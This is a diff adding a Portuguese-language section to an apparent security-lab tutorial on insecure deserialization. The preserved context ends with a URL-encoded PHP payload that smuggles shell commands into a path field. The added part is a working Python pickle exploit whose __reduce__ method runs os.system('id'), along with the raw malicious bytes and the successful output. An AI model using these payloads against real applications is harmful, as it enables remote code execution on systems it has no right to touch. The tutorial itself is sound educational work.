@@ -95,3 +95,67 @@ O payload final ficará assim:
 a%3A2%3A%7Bs%3A7%3A%22payload%22%3BO%3A11%3A%22FileManager%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A52%3A%22%2Ftmp%2Ftest%2F%3Bmkdir%20%2Ftmp%2Frce%2F%3B%20id%3E%2Ftmp%2Frce%2Fid.txt%3B%20echo%22%3B%7D%7D
 ```
 {% endcode %}
+
+## Python
+
+Em Python, nao e necessario ter aquela estrutura de destruct igual no php, basta ter um pickle.loads que conseguimos controlar o que e enviado e assim executar algum comando
+
+```python
+import pickle
+import os
+
+class exploit(object):
+    def __reduce__(self):
+        return (os.system, ('id', 'test'))
+
+malicious_object = pickle.dumps(exploit())
+print(malicious_object)
+pickle.loads(malicious_object)
+```
+
+Temos: 
+
+```
+$ python3 exploity-id.py 
+
+b'\x80\x04\x95$\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x8c\x04test\x94\x86\x94R\x94.'
+Traceback (most recent call last):
+  File "/home/nizyuu/Desktop/cybersec-labs/public/insecure-deserialization-python/exploity-id.py", line 10, in <module>
+    pickle.loads(malicious_object)
+TypeError: system() takes at most 1 argument (2 given)
+```
+
+Com isso, temos um erro porque e esperado que passe apenas um argumento na funcao `system` porem ao mesmo tempo e esperado que passe mais de um argumento para ser uma tupla. Podemos burlar isso apenas passando um paramentro e depois uma virgula, que assim ira ser uma tupla.
+
+```
+	return (os.system, ('id',))
+```
+
+Sucesso
+
+```
+$ python3 exploity-id.py
+ 
+b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
+uid=1000(nizyuu) gid=1000(nizyuu) groups=1000(nizyuu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
+```
+
+Com isso, podemos notar que em qualquer aplicacao python que estiver usando o `pickle.loads()` podemos enviar esse binario que conseguimos executar o comando id.
+
+{% code overflow="wrap" fullWidth="false" %}
+```python
+import pickle
+
+import os
+
+pickle.loads(b"\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.")
+```
+{% endcode %}
+
+Executamos
+
+```
+$ python3 exploity-id.py 
+
+uid=1000(nizyuu) gid=1000(nizyuu) groups=1000(nizyuu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
+```
